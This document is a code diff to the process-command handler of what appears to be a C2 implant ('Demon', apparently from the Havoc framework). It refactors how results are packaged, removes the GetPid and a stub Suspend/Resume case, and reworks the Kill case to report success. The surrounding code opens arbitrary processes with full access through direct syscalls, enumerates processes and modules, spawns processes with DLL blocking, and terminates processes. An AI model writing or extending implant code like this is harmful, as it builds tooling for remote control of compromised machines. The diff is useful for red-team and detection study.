@@ -239,14 +239,10 @@ VOID CommandProc( PPARSER DataArgs )
     PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );
     NTSTATUS    NtStatus    = STATUS_SUCCESS;
 
+    PackageAddInt32( Package, SubCommand );
+
     switch ( SubCommand )
     {
-        case 1: PUTS("Proc::GetPid")
-        {
-            PackageAddInt32( Package, 1 );
-            break;
-        }
-
         case 2: PUTS("Proc::Modules")
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
@@ -256,8 +252,6 @@ VOID CommandProc( PPARSER DataArgs )
             NTSTATUS                  NtStatus         = STATUS_SUCCESS;
             CLIENT_ID                 ProcClientID     = { 0, 0 };
             OBJECT_ATTRIBUTES         ObjAttr          = { sizeof( OBJECT_ATTRIBUTES ) };
-
-            PackageAddInt32( Package, 2 );
 
             if ( DataArgs->Length > 0 )
                 ProcessID = ParserGetInt32( DataArgs );
@@ -335,8 +329,6 @@ VOID CommandProc( PPARSER DataArgs )
             UINT32  ProcUserSize         = 0;
 
             ProcessName = ParserGetBytes( DataArgs, &ProcessSize );
-
-            PackageAddInt32( Package, 3 );
 
             NtStatus = Instance->Syscall.NtAllocateVirtualMemory( NtCurrentProcess() , &ProcessInformationList, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
             if ( NT_SUCCESS( NtStatus ) )
@@ -423,8 +415,6 @@ VOID CommandProc( PPARSER DataArgs )
             PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
             PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );
 
-            PackageAddInt32( Package, 4 );
-
             // TODO: make it optional to choose process arch
             // TODO: cleanup process info
             if ( ! ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL ) )
@@ -447,7 +437,6 @@ VOID CommandProc( PPARSER DataArgs )
         {
             UINT32 BlockOnOrOff = ParserGetInt32( DataArgs );
 
-            PackageAddInt32( Package, 5 );
             Instance->Config.Process.BlockDll = ( BOOL ) BlockOnOrOff;
             PackageAddInt32( Package, BlockOnOrOff );
 
@@ -464,8 +453,6 @@ VOID CommandProc( PPARSER DataArgs )
             HANDLE                      hProcess    = NULL;
             OBJECT_ATTRIBUTES           ObjAttr     = { 0 };
             CLIENT_ID                   ClientID    = { 0 };
-
-            PackageAddInt32( Package, 6 );
 
             ClientID.UniqueProcess = ProcessID;
             if ( NT_SUCCESS( Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID ) ) )
@@ -511,28 +498,7 @@ VOID CommandProc( PPARSER DataArgs )
             }
         }
 
-        // TODO: maybe remove
-        case 7: PUTS( "Proc::Suspend|Resume" )
-        {
-            PackageAddInt32( Package, 7 );
-
-            UINT32 SuspendResume = ParserGetInt32( DataArgs );
-            UINT32 ProcessID     = ParserGetInt32( DataArgs );
-
-            // Suspend
-            if ( SuspendResume == 0 )
-            {
-
-            }
-
-            // Resume
-            else if ( SuspendResume == 1 )
-            {
-
-            }
-        }
-
-        case 8: PUTS( "Proc::Kill" )
+        case 7: PUTS( "Proc::Kill" )
         {
             DWORD             dwProcessID = ParserGetInt32( DataArgs );
             HANDLE            hProcess    = NULL;
@@ -542,11 +508,13 @@ VOID CommandProc( PPARSER DataArgs )
 
             NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_TERMINATE, &ObjectAttr, &ClientID );
             if ( NT_SUCCESS( NtStatus ) )
-            {
                 Instance->Win32.TerminateProcess( hProcess, 0 );
-                Instance->Win32.NtClose( hProcess );
-                return;
-            }
+
+            PackageAddInt32( Package, NT_SUCCESS( NtStatus ) );
+            PackageAddInt32( Package, dwProcessID );
+
+            Instance->Win32.NtClose( hProcess );
+            hProcess = NULL;
 
             break;
         }
